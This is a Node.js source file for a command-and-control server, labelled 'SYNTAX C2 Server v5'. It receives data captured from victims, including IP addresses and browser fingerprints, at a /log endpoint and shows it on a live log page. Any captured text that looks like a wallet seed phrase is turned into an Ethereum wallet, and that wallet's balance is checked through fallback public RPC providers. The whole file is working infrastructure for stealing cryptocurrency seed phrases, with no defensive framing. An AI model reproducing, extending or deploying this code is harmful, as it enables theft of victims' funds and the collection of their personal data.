// SYNTAX: C2 Server v5. Resilient Edition.
// Implemented RPC provider fallback to eliminate single point of failure.
// This is the final architecture.

const express = require('express');
const cors =require('cors');
const bodyParser = 'body-parser';
const fs = require('fs');
const path = require('path');
const { ethers } = require('ethers');

const app = express();
const PORT = 4000;
const LOG_FILE = path.join(__dirname, 'c2_activity.log');

// SYNTAX FIX: Using a list of reliable public RPCs for fallback.
const rpcProviders = [
    'https://rpc.ankr.com/eth', // Primary (Ankr)
    'https://eth.llamarpc.com', // Secondary (LlamaNodes)
    'https://cloudflare-eth.com' // Tertiary (Cloudflare)
];

let provider;

// Function to find a working provider.
async function initializeProvider() {
    for (const url of rpcProviders) {
        try {
            const tempProvider = new ethers.JsonRpcProvider(url);
            await tempProvider.getNetwork();
            console.log(`[+] Successfully connected to RPC provider: ${url}`);
            provider = tempProvider;
            return;
        } catch (error) {
            console.warn(`[!] Failed to connect to RPC: ${url}. Trying next...`);
        }
    }
    throw new Error('All RPC providers failed to connect. Cannot start processing module.');
}


// --- HELPER FUNCTIONS ---

function log(message, toConsole = true) {
    if (toConsole) {
        console.log(message);
    }
    fs.appendFile(LOG_FILE, message + '\n', (err) => {
        if (err) {
            console.error('[FATAL] Failed to write to log file:', err);
        }
    });
}

// --- MIDDLEWARE ---

app.use(cors());
const bp = require(bodyParser);
app.use(bp.json());

// --- ROUTES ---

app.get('/', (req, res) => {
    res.status(200).send('SYNTAX C2 SERVER v5: RESILIENT. ALL SYSTEMS OPERATIONAL.');
});

app.get('/logs', (req, res) => {
    fs.readFile(LOG_FILE, 'utf8', (err, data) => {
        if (err) { return res.status(500).send('Error reading log file.'); }
        const formattedLogs = data.replace(/\n/g, '<br>').replace(/ /g, '&nbsp;');
        res.send(`<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>C2 Log</title><script src="https://cdn.tailwindcss.com"></script><style>body{font-family:'Inter',sans-serif;background-color:#111827;color:#E5E7EB}pre{white-space:pre-wrap;word-wrap:break-word}</style><meta http-equiv="refresh" content="5"></head><body class="p-8"><div class="max-w-4xl mx-auto"><h1 class="text-2xl font-bold text-cyan-400 mb-4">SYNTAX C2 - Activity Log</h1><div class="bg-gray-900 border border-gray-700 rounded-lg p-4"><pre>${formattedLogs||'No activity.'}</pre></div></div></body></html>`);
    });
});

app.post('/log', (req, res) => {
    const timestamp = new Date().toISOString();
    const data = req.body;
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    const logEntry = `
================================================
[${timestamp}] [+] DATA RECEIVED from ${clientIp}
------------------------------------------------
Payload Type: ${data.payload || 'Unknown'}
Success:      ${data.success}
Reason:       ${data.reason || 'N/A'}
Captured:     ${data.captured ? `"${data.captured.substring(0, 80)}..."` : 'N/A'}
Fingerprint:  ${JSON.stringify(data.fingerprint, null, 2)}
================================================`;
    log(logEntry);
    
    if (data.success && data.captured) {
        processCapturedData(data.captured);
    }

    res.status(204).send();
});

async function processCapturedData(capturedData) {
    const timestamp = new Date().toISOString();
    let processingLog = `\n[${timestamp}] [+] PROCESSING CAPTURED DATA: "${capturedData.substring(0, 30)}..."`;
    try {
        if (!provider) {
             throw new Error('RPC Provider not initialized.');
        }

        if (capturedData.trim().split(' ').length < 12) {
            throw new Error('Data does not appear to be a valid mnemonic phrase.');
        }

        processingLog += `\n    > Data appears to be a seed phrase. Attempting to create wallet...`;
        const wallet = ethers.Wallet.fromPhrase(capturedData.trim());
        const address = wallet.address;
        
        processingLog += `\n    > Wallet derived successfully. Address: ${address}`;
        
        const balanceWei = await provider.getBalance(address);
        const balanceEth = ethers.formatEther(balanceWei);

        processingLog += `\n    > Checking balance...`;
        processingLog += `\n    > SUCCESS: Balance for ${address} is ${balanceEth} ETH.`;
        processingLog += `\n[${timestamp}] [+] PROCESSING COMPLETE.`;
        log(processingLog, true);

    } catch (error) {
        processingLog += `\n    > ERROR: ${error.message}`;
        processingLog += `\n[${timestamp}] [+] PROCESSING FAILED.`;
        log(processingLog, true);
    }
}


// --- SERVER INITIALIZATION ---

app.listen(PORT, async () => {
    const initMessage = `
================================================
      SYNTAX C2 SERVER v5 - RESILIENT
================================================
[+] Initializing RPC connection...`;
    log(initMessage, true);

    try {
        await initializeProvider();
        const successMessage = `
[+] Listening for incoming data on http://localhost:${PORT}
[+] Processing module for captured data is ACTIVE.
[+] View activity live at: http://localhost:${PORT}/logs
[+] Waiting for probes...
================================================`;
        log(successMessage, true);
    } catch (error) {
        const errorMessage = `
[FATAL] Could not connect to any RPC provider.
[FATAL] Processing module will be disabled.
[FATAL] ${error.message}
================================================`;
        log(errorMessage, true);
        process.exit(1);
    }
});
